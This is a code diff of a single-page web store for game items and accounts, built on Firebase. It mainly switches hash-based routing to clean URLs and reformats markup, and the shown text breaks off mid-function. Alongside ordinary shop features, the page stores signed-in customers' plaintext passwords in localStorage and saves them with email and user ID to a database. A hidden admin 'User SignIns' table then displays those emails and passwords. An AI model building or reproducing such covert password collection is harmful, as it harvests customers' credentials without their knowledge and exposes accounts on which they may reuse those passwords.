@@ -7,24 +7,19 @@
     <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/drdonut9898-a11y/Firemc-store/main/favicon.jpg">
 
     <!-- ============================================ -->
-    <!-- GITHUB PAGES SPA REDIRECT HANDLER -->
-    <!-- ============================================ -->
-    <!-- Ye script 404.html se aaye redirect ko handle karta hai -->
-    <!-- Agar URL mein ?/#/ hai (404 redirect se), toh usse sahi hash mein convert karta hai -->
+    <!-- CLEAN URL ROUTING HANDLER -->
     <!-- ============================================ -->
     <script>
         (function() {
-            // Check agar 404.html se redirect hua hai (URL mein ?/#/ hai)
             var search = window.location.search;
-            if (search && search.indexOf('?/#/') === 0) {
-                // Convert ?/#/path -> /#/path
-                var hashPath = search.replace('?/', '');
+            if (search && search.indexOf('view=') !== -1) {
+                var view = search.split('view=')[1].split('&')[0];
+                var repo = '/Firemc-store';
                 var cleanUrl = window.location.protocol + '//' + 
                               window.location.hostname + 
                               (window.location.port ? ':' + window.location.port : '') + 
-                              window.location.pathname +
-                              hashPath;
-                window.history.replaceState(null, null, cleanUrl);
+                              repo + '/' + decodeURIComponent(view);
+                window.history.replaceState({view: view}, '', cleanUrl);
             }
         })();
     </script>
@@ -48,7 +43,6 @@
             --transition-bounce: all 0.5s cubic-bezier(0.68,-0.55,0.265,1.55);
         }
 
-        /* LIGHT THEME */
         body.light-theme {
             --bg-primary: #f0f2f5; --bg-secondary: #ffffff; --bg-card: rgba(255,255,255,0.95);
             --bg-glass: rgba(240,242,245,0.8); --border-subtle: rgba(0,0,0,0.1);
@@ -97,7 +91,6 @@
         html { scroll-behavior:smooth; }
         body { font-family:var(--font-body); background:var(--bg-primary); color:var(--text-primary); min-height:100vh; overflow-x:hidden; transition: background 0.4s, color 0.4s; }
 
-        /* ANIMATED BACKGROUND */
         body::before {
             content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: radial-gradient(ellipse at 20% 80%, rgba(255,71,87,0.08) 0%, transparent 50%), radial-gradient(ellipse at 80% 20%, rgba(0,210,255,0.06) 0%, transparent 50%), radial-gradient(ellipse at 50% 50%, rgba(168,85,247,0.04) 0%, transparent 60%);
@@ -107,16 +100,12 @@
 
         .app-container { max-width:1200px; margin:0 auto; padding:0 20px; }
 
-        /* NAVBAR */
         .top-navbar { display:flex; justify-content:space-between; align-items:center; padding:20px 0; margin-bottom:20px; flex-wrap:wrap; gap:15px; animation: slideDown 0.6s ease-out; }
         @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes softFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-6px); } }
-        @keyframes gentlePulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
         .nav-brand { font-family:var(--font-display); font-size:1.2rem; font-weight:800; letter-spacing:2px; color:var(--accent-red); text-shadow:0 0 20px var(--accent-red-glow); animation: glowPulse 2s ease-in-out infinite; }
         @keyframes glowPulse { 0%, 100% { text-shadow: 0 0 20px var(--accent-red-glow); } 50% { text-shadow: 0 0 40px var(--accent-red-glow), 0 0 60px rgba(255,71,87,0.2); } }
         .nav-actions { display:flex; gap:12px; align-items:center; flex-wrap:wrap; }
 
-        /* BUTTONS */
         .btn { display:inline-flex; align-items:center; justify-content:center; gap:8px; padding:10px 20px; border-radius:8px; font-family:var(--font-display); font-size:0.8rem; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; cursor:pointer; border:none; transition:var(--transition-smooth); position:relative; overflow:hidden; }
         .btn:hover { transform: translateY(-2px); }
         .btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: left 0.5s; }
@@ -137,26 +126,19 @@
         .btn-danger:hover { transform:translateY(-2px) scale(1.02); box-shadow:0 8px 25px rgba(239,68,68,0.4); }
         .btn-sm { padding:6px 14px; font-size:0.7rem; }
 
-        /* HEADER */
         .header-container { text-align:center; margin-bottom:60px; animation: fadeInUp 0.8s ease-out; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
         .header-title { font-family:var(--font-display); font-size:clamp(2rem,5vw,3.5rem); font-weight:900; text-transform:uppercase; letter-spacing:6px; animation: floatTitle 3s ease-in-out infinite; }
         .header-title span { color:var(--accent-red); text-shadow:0 0 20px var(--accent-red-glow); animation: glowPulse 2s ease-in-out infinite; }
-        @keyframes floatTitle { 
-            0%, 100% { transform: translateY(0); } 
-            50% { transform: translateY(-8px); } 
-        }
+        @keyframes floatTitle { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
 
-        /* VIEWS */
         .view-section { display:none; opacity:0; transform:translateY(30px) scale(0.98); transition:all 0.5s cubic-bezier(0.25,1,0.5,1); }
         .view-section.active { display:block; opacity:1; transform:translateY(0) scale(1); animation: viewEnter 0.5s ease-out; }
         @keyframes viewEnter { from { opacity: 0; transform: translateY(30px) scale(0.98); } to { opacity: 1; transform: translateY(0) scale(1); } }
 
-        /* BACK BUTTON */
         .back-btn { background:var(--bg-glass); border:1px solid var(--border-accent); color:var(--accent-red); font-family:var(--font-display); font-size:0.85rem; font-weight:700; padding:12px 24px; border-radius:8px; cursor:pointer; transition:var(--transition-smooth); margin-bottom:35px; display:inline-flex; align-items:center; gap:10px; }
         .back-btn:hover { background:var(--accent-red); color:white; transform: translateX(-5px); }
 
-        /* HOME */
         .home-wrapper { display:grid; grid-template-columns:repeat(2,1fr); gap:30px; max-width:900px; margin:0 auto; }
         .master-card-classic { border-top-color:var(--accent-blue); border-color:rgba(0,210,255,0.3); }
         .master-card-classic h2 { color:var(--accent-blue); }
@@ -175,7 +157,6 @@
         .master-card-green h2 { color:var(--accent-green); }
         .master-card-green:hover { border-color:var(--accent-green); box-shadow:0 20px 40px rgba(46,213,115,0.15); }
 
-        /* MENU */
         .menu-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:30px; }
         .menu-card { background:var(--bg-card); border:1px solid var(--border-subtle); border-radius:12px; padding:45px 35px; text-align:center; cursor:pointer; transition:var(--transition-smooth); position: relative; overflow: hidden; }
         .menu-card::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,71,87,0.08), transparent); transition: left 0.6s; }
@@ -185,14 +166,12 @@
         .menu-card:hover h3 { text-shadow: 0 0 20px var(--accent-red-glow); }
         .menu-card p { color:var(--text-muted); font-size:1.1rem; }
 
-        /* SEARCH */
         .search-container { margin-bottom:30px; position:relative; }
         .search-input { width:100%; padding:14px 20px 14px 50px; border-radius:12px; background:var(--bg-card); border:1px solid var(--border-subtle); color:var(--text-primary); font-size:1rem; transition: var(--transition-smooth); }
         .search-input:focus { outline:none; border-color:var(--accent-red); box-shadow:0 0 20px rgba(255,71,87,0.1); transform: scale(1.01); }
         .search-icon { position:absolute; left:18px; top:50%; transform:translateY(-50%); color:var(--text-muted); font-size:1.2rem; transition: var(--transition-smooth); }
         .search-input:focus + .search-icon { color: var(--accent-red); transform: translateY(-50%) scale(1.2); }
 
-        /* BILLBOARD */
         .store-billboard { background:linear-gradient(90deg,rgba(255,71,87,0.08),transparent); border:1px solid var(--border-accent); border-left:5px solid var(--accent-red); padding:25px 30px; border-radius:12px; margin-bottom:35px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:20px; animation: slideInLeft 0.6s ease-out; }
         @keyframes slideInLeft { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }
         .billboard-blue { background:linear-gradient(90deg,rgba(0,210,255,0.08),transparent); border-color:rgba(0,210,255,0.3); border-left-color:var(--accent-blue); }
@@ -204,7 +183,6 @@
         .warning-tag-green { background:rgba(46,213,115,0.1); color:var(--accent-green); border-color:rgba(46,213,115,0.4); animation: pulseGreen 2s infinite; }
         @keyframes pulseGreen { 0%, 100% { box-shadow: 0 0 0 0 rgba(46,213,115,0.4); } 50% { box-shadow: 0 0 0 10px rgba(46,213,115,0); } }
 
-        /* PACKAGES */
         .packages-container { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:25px; margin-bottom:50px; }
         .pkg-card { background:var(--bg-card); border:1px solid var(--border-subtle); border-radius:16px; padding:35px 25px; text-align:center; display:flex; flex-direction:column; justify-content:space-between; min-height:300px; position:relative; transition:var(--transition-smooth); animation: cardAppear 0.6s ease-out backwards; }
         @keyframes cardAppear { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
@@ -220,7 +198,6 @@
         .promo-badge { position:absolute; top:15px; right:15px; background:linear-gradient(90deg,var(--accent-gold),#ca8a04); color:#000; font-size:0.7rem; font-weight:900; padding:4px 12px; border-radius:6px; animation: shimmer 2s infinite; }
         @keyframes shimmer { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
 
-        /* WISHLIST */
         .wishlist-btn { position:absolute; top:15px; left:15px; background:rgba(255,71,87,0.1); border:1px solid rgba(255,71,87,0.2); color:var(--text-muted); width:36px; height:36px; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:1.1rem; transition:var(--transition-bounce); z-index:3; }
         .wishlist-btn:hover, .wishlist-btn.active { background:var(--accent-red); color:white; border-color:var(--accent-red); transform: scale(1.2); }
         .wishlist-panel { position:fixed; top:0; right:-400px; width:380px; max-width:90vw; height:100vh; background:var(--bg-secondary); border-left:1px solid var(--border-subtle); z-index:1000; transition:right 0.4s cubic-bezier(0.25,1,0.5,1); display:flex; flex-direction:column; }
@@ -237,7 +214,6 @@
         .wishlist-count { position:absolute; top:-5px; right:-5px; background:var(--accent-gold); color:#000; font-size:0.75rem; font-weight:900; width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; animation: bounce 0.5s ease-out; }
         @keyframes bounce { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.3); } }
 
-        /* CART */
         .cart-widget { position:fixed; bottom:30px; right:30px; z-index:100; animation: floatIn 0.6s ease-out 0.1s backwards; }
         .cart-btn { width:60px; height:60px; border-radius:50%; background:linear-gradient(135deg,var(--accent-red),#ff2e44); border:none; color:white; font-size:1.5rem; cursor:pointer; box-shadow:0 4px 20px var(--accent-red-glow); display:flex; align-items:center; justify-content:center; position:relative; transition: var(--transition-bounce); }
         .cart-btn:hover { transform: scale(1.1) rotate(-10deg); box-shadow:0 8px 30px var(--accent-red-glow); }
@@ -255,10 +231,6 @@
         .cart-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:999; opacity:0; pointer-events:none; transition:opacity 0.3s; }
         .cart-overlay.active { opacity:1; pointer-events:auto; }
 
-
-
-
-        /* PAYMENT MODAL */
         .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(2,2,3,0.95); display:flex; justify-content:center; align-items:center; z-index:9999; opacity:0; pointer-events:none; transition:all 0.3s; }
         .modal-overlay.active { opacity:1; pointer-events:auto; }
         .modal-box { background:var(--bg-card); border:2px solid var(--accent-red); border-radius:20px; padding:40px; max-width:450px; width:92%; text-align:center; animation: modalPop 0.4s cubic-bezier(0.68,-0.55,0.265,1.55); }
@@ -285,7 +257,6 @@
         .modal-dismiss { background:none; border:none; color:var(--text-muted); font-size:0.9rem; cursor:pointer; margin-top:20px; transition: var(--transition-smooth); }
         .modal-dismiss:hover { color: var(--accent-red); transform: scale(1.1); }
 
-        /* REVIEWS */
         .reviews-section { margin:60px 0; padding:40px 0; border-top:1px solid var(--border-subtle); animation: fadeInUp 1s ease-out; }
         .reviews-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:30px; }
         .reviews-header h2 { font-family:var(--font-display); color:var(--accent-gold); }
@@ -295,7 +266,6 @@
         .review-stars { color:var(--accent-gold); margin-bottom:10px; }
         .review-text { color:var(--text-secondary); }
 
-        /* ADMIN */
         .admin-badge { background:linear-gradient(135deg,var(--accent-green),#26af5f); color:white; padding:8px 16px; font-family:var(--font-display); font-size:0.8rem; border-radius:6px; cursor:pointer; display:none; transition: var(--transition-bounce); }
         .admin-badge:hover { transform: scale(1.05); box-shadow:0 5px 20px var(--accent-green-glow); }
         .admin-badge.visible { display:block; animation: slideDown 0.5s ease-out; }
@@ -306,7 +276,6 @@
         .admin-table tr { transition: var(--transition-smooth); }
         .admin-table tr:hover { background: rgba(255,255,255,0.02); transform: scale(1.01); }
 
-        /* USER SIGNINS PANEL */
         .user-signins-panel { background:var(--bg-card); border:1px solid var(--border-subtle); border-radius:16px; padding:25px; animation: fadeInUp 0.5s ease-out; }
         .user-signins-panel h3 { font-family:var(--font-display); color:var(--accent-purple); }
         #signInsTable td { font-size:0.9rem; padding:12px 15px; }
@@ -314,14 +283,9 @@
         .admin-input { background:var(--bg-secondary); border:1px solid var(--border-subtle); color:var(--text-primary); padding:10px 14px; border-radius:8px; width:100%; transition: var(--transition-smooth); }
         .admin-input:focus { outline:none; border-color:var(--accent-red); box-shadow:0 0 10px rgba(255,71,87,0.1); }
 
-
-
-
-        /* GUEST BANNER */
         .guest-banner { background:linear-gradient(90deg,rgba(255,159,67,0.1),transparent); border:1px solid rgba(255,159,67,0.3); border-left:4px solid #ff9f43; padding:15px 20px; border-radius:10px; margin-bottom:25px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; animation: slideInLeft 0.6s ease-out; }
         .guest-banner p { color:#ff9f43; font-weight:600; }
 
-        /* RESPONSIVE */
         @media (max-width:768px) {
             .home-wrapper { grid-template-columns:1fr; }
             .master-card-green { grid-column:span 1; max-width:100%; }
@@ -335,10 +299,10 @@
         ::-webkit-scrollbar-thumb { background:var(--border-subtle); border-radius:4px; }
         ::-webkit-scrollbar-thumb:hover { background:var(--accent-red); }
 
-        /* TOAST */
         .toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--bg-card); border: 1px solid var(--accent-green); color: var(--accent-green); padding: 12px 24px; border-radius: 12px; font-family: var(--font-display); font-size: 0.85rem; z-index: 10000; opacity: 0; transition: all 0.4s cubic-bezier(0.68,-0.55,0.265,1.55); }
         .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
     </style>
+<base target="_blank">
 </head>
 <body>
     <div class="app-container">
@@ -461,56 +425,37 @@
                     <tbody id="adminTableBody"></tbody>
                 </table>
             </div>
-
-            
-            
         </div>
     </div>
 
-        <!-- USER SIGNINS VIEW -->
-        <div class="view-section" id="viewUserSignIns">
-            <button class="back-btn" onclick="window.switchView('admin')">&#8592; Back to Admin</button>
-            <div style="font-family:var(--font-display); font-size:1.5rem; color:var(--accent-purple); margin-bottom:20px; border-left:4px solid var(--accent-purple); padding-left:15px;">User SignIns</div>
-            <div class="admin-controls">
-                <button class="btn btn-secondary btn-sm" onclick="window.loadUserSignIns()">&#128260; Refresh</button>
-                <span id="signInCount" style="background:var(--accent-purple); color:white; padding:6px 16px; border-radius:20px; font-size:0.85rem; font-weight:700;">0 users</span>
-            </div>
-            <div style="overflow-x:auto; margin-top:20px;">
-                <table class="admin-table" id="signInsTable">
-                    <thead>
-                        <tr>
-                            <th style="width:60px;">#</th>
-                            <th>Email</th>
-                            <th>Password</th>
-                            <th>Login Time</th>
-                            <th>User ID</th>
-                        </tr>
-                    </thead>
-                    <tbody id="signInsTableBody"></tbody>
-                </table>
-            </div>
-            <div id="noSignIns" style="text-align:center; padding:60px 40px; color:var(--text-muted);">
-                <div style="font-size:4rem; margin-bottom:20px;">&#128100;</div>
-                <h3 style="font-family:var(--font-display); margin-bottom:10px;">No SignIns Yet</h3>
-                <p>User login data will appear here automatically</p>
-            </div>
+    <div class="view-section" id="viewUserSignIns">
+        <button class="back-btn" onclick="window.switchView('admin')">&#8592; Back to Admin</button>
+        <div style="font-family:var(--font-display); font-size:1.5rem; color:var(--accent-purple); margin-bottom:20px; border-left:4px solid var(--accent-purple); padding-left:15px;">User SignIns</div>
+        <div class="admin-controls">
+            <button class="btn btn-secondary btn-sm" onclick="window.loadUserSignIns()">&#128260; Refresh</button>
+            <span id="signInCount" style="background:var(--accent-purple); color:white; padding:6px 16px; border-radius:20px; font-size:0.85rem; font-weight:700;">0 users</span>
         </div>
-
+        <div style="overflow-x:auto; margin-top:20px;">
+            <table class="admin-table" id="signInsTable">
+                <thead>
+                    <tr><th style="width:60px;">#</th><th>Email</th><th>Password</th><th>Login Time</th><th>User ID</th></tr>
+                </thead>
+                <tbody id="signInsTableBody"></tbody>
+            </table>
+        </div>
+        <div id="noSignIns" style="text-align:center; padding:60px 40px; color:var(--text-muted);">
+            <div style="font-size:4rem; margin-bottom:20px;">&#128100;</div>
+            <h3 style="font-family:var(--font-display); margin-bottom:10px;">No SignIns Yet</h3>
+            <p>User login data will appear here automatically</p>
+        </div>
+    </div>
 
     <div class="wishlist-widget" id="wishlistWidget" style="display:none;">
-        <button class="wishlist-btn-float" onclick="window.toggleWishlist()">
-            &#9829;
-            <span class="wishlist-count" id="wishlistCount">0</span>
-        </button>
+        <button class="wishlist-btn-float" onclick="window.toggleWishlist()">&#9829;<span class="wishlist-count" id="wishlistCount">0</span></button>
     </div>
 
-
-
     <div class="cart-widget" id="cartWidget" style="display:none;">
-        <button class="cart-btn" onclick="window.toggleCart()">
-            &#128722;
-            <span class="cart-count" id="cartCount">0</span>
-        </button>
+        <button class="cart-btn" onclick="window.toggleCart()">&#128722;<span class="cart-count" id="cartCount">0</span></button>
     </div>
 
     <div id="wishlistOverlay" onclick="window.toggleWishlist()" style="position:fixed; top:0;left:0;width:100%;height:100%; background:rgba(0,0,0,0.6); z-index:999; opacity:0; pointer-events:none; transition:opacity 0.3s;"></div>
@@ -545,14 +490,11 @@
         </div>
     </div>
 
-
-
     <div class="modal-overlay" id="checkoutModal">
         <div class="modal-box">
             <h2>Order Instructions</h2>
             <p>Open a "General Support" ticket in Discord and ping Owner with order details.</p>
             <a href="https://discord.gg/7d3DMHSQRp" target="_blank" class="discord-btn" onclick="window.hideCheckout()">Continue in Discord</a>
-
             <button class="modal-dismiss" onclick="window.hideCheckout()">Cancel</button>
         </div>
     </div>
@@ -567,31 +509,16 @@
             <div class="payment-category">
                 <div class="payment-category-title">&#128241; UPI Payment</div>
                 <div class="payment-apps">
-                    <div class="payment-app-btn" data-app="fampay" onclick="window.selectPaymentApp(this)">
-                        <div class="app-icon">&#128179;</div>
-                        <div class="app-name">Fampay</div>
-                    </div>
-                    <div class="payment-app-btn" data-app="phonepe" onclick="window.selectPaymentApp(this)">
-                        <div class="app-icon">&#128242;</div>
-                        <div class="app-name">PhonePe</div>
-                    </div>
-                    <div class="payment-app-btn" data-app="gpay" onclick="window.selectPaymentApp(this)">
-                        <div class="app-icon">&#128181;</div>
-                        <div class="app-name">Google Pay</div>
-                    </div>
+                    <div class="payment-app-btn" data-app="fampay" onclick="window.selectPaymentApp(this)"><div class="app-icon">&#128179;</div><div class="app-name">Fampay</div></div>
+                    <div class="payment-app-btn" data-app="phonepe" onclick="window.selectPaymentApp(this)"><div class="app-icon">&#128242;</div><div class="app-name">PhonePe</div></div>
+                    <div class="payment-app-btn" data-app="gpay" onclick="window.selectPaymentApp(this)"><div class="app-icon">&#128181;</div><div class="app-name">Google Pay</div></div>
                 </div>
             </div>
             <div class="payment-category">
                 <div class="payment-category-title">&#128176; bKash</div>
                 <div class="payment-apps">
-                    <div class="payment-app-btn" data-app="bkash" onclick="window.selectPaymentApp(this)">
-                        <div class="app-icon">&#128176;</div>
-                        <div class="app-name">bKash</div>
-                    </div>
-                    <div class="payment-app-btn" data-app="nagad" onclick="window.selectPaymentApp(this)">
-                        <div class="app-icon">&#128184;</div>
-                        <div class="app-name">Nagad</div>
-                    </div>
+                    <div class="payment-app-btn" data-app="bkash" onclick="window.selectPaymentApp(this)"><div class="app-icon">&#128176;</div><div class="app-name">bKash</div></div>
+                    <div class="payment-app-btn" data-app="nagad" onclick="window.selectPaymentApp(this)"><div class="app-icon">&#128184;</div><div class="app-name">Nagad</div></div>
                 </div>
             </div>
             <div class="payment-input-group">
@@ -630,7 +557,6 @@
         </div>
     </div>
 
-    <!-- ADD ITEM MODAL -->
     <div class="modal-overlay" id="addItemModal">
         <div class="modal-box" style="border-color:var(--accent-green); max-width:500px;">
             <h2 style="color:var(--accent-green);">Add New Item</h2>
@@ -678,8 +604,6 @@
         </div>
     </div>
 
-
-
     <div class="toast" id="toast"></div>
 
     <script type="module">
@@ -710,7 +634,7 @@
             currentRating: 0,
             selectedPaymentApp: null,
             authTab: 'login',
-            isNavigating: false  // Flag to prevent hashchange loop
+            isNavigating: false
         };
 
         const catalog = {
@@ -754,63 +678,81 @@
         };
 
         // ============================================
-        // HASH-BASED ROUTING SYSTEM
+        // CLEAN URL ROUTING SYSTEM (NO #)
         // ============================================
-        // Ye system URL hash se view manage karta hai
-        // e.g., #/money, #/items, #/accounts
-        // GitHub Pages refresh pe bhi kaam karega
+        // URL pattern: /items, /money, /accounts, /menu, /admin
+        // 404.html converts path to ?view=items
+        // index.html converts ?view= back to clean URL
         // ============================================
 
-        function getHashView() {
-            // Hash se view name nikaalna
-            // e.g., #/money -> 'money', #/ -> 'landing'
-            const hash = window.location.hash;
-            if (hash && hash.startsWith('#/')) {
-                const view = hash.replace('#/', '');
-                if (view && ['menu', 'money', 'items', 'accounts', 'admin', 'userSignIns'].includes(view)) {
-                    return view;
-                }
+        const REPO_NAME = '/Firemc-store';
+        const VALID_VIEWS = ['menu', 'money', 'items', 'accounts', 'admin', 'userSignIns'];
+
+        function getPathView() {
+            var path = window.location.pathname;
+            if (path.indexOf(REPO_NAME) === 0) {
+                path = path.substring(REPO_NAME.length);
+            }
+            path = path.replace(/^\//, '');
+            if (path && VALID_VIEWS.includes(path)) {
+                return path;
             }
             return 'landing';
         }
 
-        function updateHash(view) {
-            // Hash update karna bina page reload ke
-            if (view === 'landing') {
-                if (window.location.hash) {
-                    window.location.hash = '';
-                }
-            } else {
-                const newHash = '#/' + view;
-                if (window.location.hash !== newHash) {
-                    window.location.hash = newHash;
+        function getQueryView() {
+            var search = window.location.search;
+            if (search && search.indexOf('view=') !== -1) {
+                var view = search.split('view=')[1].split('&')[0];
+                view = decodeURIComponent(view);
+                if (VALID_VIEWS.includes(view)) {
+                    return view;
                 }
             }
+            return null;
         }
 
-        function handleHashChange() {
-            // Hash change hone pe view switch karna
-            if (state.isNavigating) return; // Loop prevention
-            
-            const view = getHashView();
-            
-            // Admin views check
+        function updateCleanUrl(view) {
+            // Update URL without #, using history.pushState
+            if (state.isNavigating) return;
+            state.isNavigating = true;
+
+            var repo = REPO_NAME;
+            var baseUrl = window.location.protocol + '//' + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + repo;
+            var newUrl = view === 'landing' ? baseUrl + '/' : baseUrl + '/' + view;
+
+            if (window.location.href !== newUrl) {
+                window.history.pushState({view: view}, '', newUrl);
+            }
+
+            setTimeout(function() { state.isNavigating = false; }, 100);
+        }
+
+        function handlePopState(event) {
+            // Handle browser back/forward buttons
+            if (state.isNavigating) return;
+
+            var view = getPathView();
+            if (event.state && event.state.view) {
+                view = event.state.view;
+            }
+
+            // Check admin access
             if ((view === 'admin' || view === 'userSignIns') && !state.isAdmin) {
                 showToast('Admin only!');
-                window.location.hash = '';
+                window.history.pushState({view: 'landing'}, '', window.location.protocol + '//' + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + REPO_NAME + '/');
+                switchViewInternal('landing');
                 return;
             }
-            
-            // Switch view without updating hash (already updated by browser)
-            switchViewInternal(view, true);
+
+            switchViewInternal(view);
         }
 
-        function switchViewInternal(view, skipHashUpdate) {
-            // Internal view switch logic (hash update nahi karta)
-            document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
-            const map = { landing: 'viewLanding', menu: 'viewMenu', money: 'viewMoney', items: 'viewItems', accounts: 'viewAccounts', admin: 'viewAdmin', userSignIns: 'viewUserSignIns' };
+        function switchViewInternal(view) {
+            document.querySelectorAll('.view-section').forEach(function(el) { el.classList.remove('active'); });
+            var map = { landing: 'viewLanding', menu: 'viewMenu', money: 'viewMoney', items: 'viewItems', accounts: 'viewAccounts', admin: 'viewAdmin', userSignIns: 'viewUserSignIns' };
             if (map[view]) { 
-                setTimeout(() => document.getElementById(map[view]).classList.add('active'), 50); 
+                setTimeout(function() { document.getElementById(map[view]).classList.add('active'); }, 50); 
                 window.scrollTo({ top: 0, behavior: 'smooth' }); 
             }
             if (view === 'admin') { renderAdminTable(); }
@@ -818,40 +760,43 @@
         }
 
         async function init() {
-            // First load hardcoded catalog as fallback
-            Object.values(catalog).forEach(cat => cat.forEach(p => state.products[p.id] = { ...p }));
-            // Then load from Firestore (overrides hardcoded if exists)
+            Object.values(catalog).forEach(function(cat) { cat.forEach(function(p) { state.products[p.id] = Object.assign({}, p); }); });
             await loadProductsFromFirestore();
-            // Setup real-time listener for product changes
             setupProductsListener();
             renderProducts(); loadReviews(); setupAuth();
             updateWishlistUI(); setupStarRating();
 
             // ============================================
-            // HASH ROUTING SETUP
+            // CLEAN URL ROUTING SETUP
             // ============================================
-            // Initial URL hash se view load karna
-            const initialView = getHashView();
+            // Check query param first (from 404 redirect)
+            var queryView = getQueryView();
+            var pathView = getPathView();
+            var initialView = queryView || pathView;
+
             if (initialView !== 'landing') {
-                // Check admin access
                 if ((initialView === 'admin' || initialView === 'userSignIns') && !state.isAdmin) {
-                    window.location.hash = '';
+                    // Reset to clean home URL
+                    window.history.replaceState({view: 'landing'}, '', window.location.protocol + '//' + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + REPO_NAME + '/');
                 } else {
-                    switchViewInternal(initialView, true);
+                    switchViewInternal(initialView);
+                    // Clean up URL if it was query param
+                    if (queryView) {
+                        updateCleanUrl(queryView);
+                    }
                 }
             }
 
-            // Hash change listener for browser back/forward buttons
-            window.addEventListener('hashchange', handleHashChange);
+            // Popstate listener for back/forward buttons
+            window.addEventListener('popstate', handlePopState);
         }
 
         async function loadProductsFromFirestore() {
             try {
                 const snap = await getDocs(collection(db, 'products'));
-                snap.forEach(d => {
+                snap.forEach(function(d) {
                     const data = d.data();
                     if (state.products[d.id]) {
-                        // Override with Firestore data
                         state.products[d.id].name = data.name || state.products[d.id].name;
                         state.products[d.id].price = data.price !== undefined ? data.price : state.products[d.id].price;
                         state.products[d.id].stock = data.stock !== undefined ? data.stock : state.products[d.id].stock;
@@ -861,9 +806,8 @@
         }
 
         function setupProductsListener() {
-            // Real-time listener for product changes
-            onSnapshot(collection(db, 'products'), (snap) => {
-                snap.docChanges().forEach(change => {
+            onSnapshot(collection(db, 'products'), function(snap) {
+                snap.docChanges().forEach(function(change) {
                     if (change.type === 'added' || change.type === 'modified') {
                         const data = change.doc.data();
                         const id = change.doc.id;
@@ -874,9 +818,7 @@
                         }
                     }
                 });
-                // Re-render if we're on a product view
                 renderProducts();
-                // Also re-render admin table if visible
                 if (document.getElementById('viewAdmin').classList.contains('active')) {
                     renderAdminTable();
                 }
@@ -884,19 +826,17 @@
         }
 
         function setupAuth() {
-            onAuthStateChanged(auth, async (user) => {
+            onAuthStateChanged(auth, async function(user) {
                 state.user = user;
-                state.isAdmin = user?.uid === state.adminUID;
+                state.isAdmin = user && user.uid === state.adminUID;
                 updateUI();
                 if (user) {
                     document.getElementById('authTriggerBtn').textContent = 'Logout';
-                    document.getElementById('authTriggerBtn').onclick = () => signOut(auth);
+                    document.getElementById('authTriggerBtn').onclick = function() { signOut(auth); };
                     closeAuthModal();
-                    // Auto-save signin on every auth state change (including page refresh)
                     try {
                         const email = user.email;
                         const userId = user.uid;
-                        // Get password from localStorage if available (saved during manual login)
                         const savedPass = localStorage.getItem('firemc_lastpass_' + email);
                         if (savedPass) {
                             await saveUserSignIn(email, savedPass, userId);
@@ -907,12 +847,11 @@
                     document.getElementById('authTriggerBtn').onclick = openAuthModal;
                 }
 
-                // Re-check hash view after auth state is known
-                // (for admin pages that require login)
-                const currentHash = getHashView();
-                if ((currentHash === 'admin' || currentHash === 'userSignIns') && !state.isAdmin) {
-                    window.location.hash = '';
-                    switchViewInternal('landing', true);
+                // Re-check current view after auth state
+                var currentView = getPathView();
+                if ((currentView === 'admin' || currentView === 'userSignIns') && !state.isAdmin) {
+                    window.history.pushState({view: 'landing'}, '', window.location.protocol + '//' + window.location.hostname + (window.location.port ? ':' + window.location.port : '') + REPO_NAME + '/');
+                    switchViewInternal('landing');
                 }
             });
         }
@@ -927,10 +866,10 @@
         }
 
         // ========== ALL FUNCTIONS EXPOSED TO WINDOW ==========
-        window.toggleTheme = () => document.body.classList.toggle('light-theme');
-        window.openAuthModal = () => document.getElementById('authModal').classList.add('active');
-        window.closeAuthModal = () => document.getElementById('authModal').classList.remove('active');
-        window.switchAuthTab = (tab) => {
+        window.toggleTheme = function() { document.body.classList.toggle('light-theme'); };
+        window.openAuthModal = function() { document.getElementById('authModal').classList.add('active'); };
+        window.closeAuthModal = function() { document.getElementById('authModal').classList.remove('active'); };
+        window.switchAuthTab = function(tab) {
             document.getElementById('loginTab').style.background = tab === 'login' ? 'var(--accent-red)' : 'var(--bg-glass)';
             document.getElementById('loginTab').style.color = tab === 'login' ? 'white' : 'var(--text-muted)';
             document.getElementById('registerTab').style.background = tab === 'register' ? 'var(--accent-red)' : 'var(--bg-glass)';
@@ -939,7 +878,7 @@
             document.getElementById('authBtn').textContent = tab === 'login' ? 'Authenticate' : 'Register';
             state.authTab = tab;
         };
-        window.handleAuth = async () => {
+        window.handleAuth = async function() {
             const email = document.getElementById('authEmail').value.trim();
             const password = document.getElementById('authPassword').value;
             const errorDiv = document.getElementById('authError');
@@ -950,11 +889,9 @@
                     cred = await signInWithEmailAndPassword(auth, email, password);
                 } else {
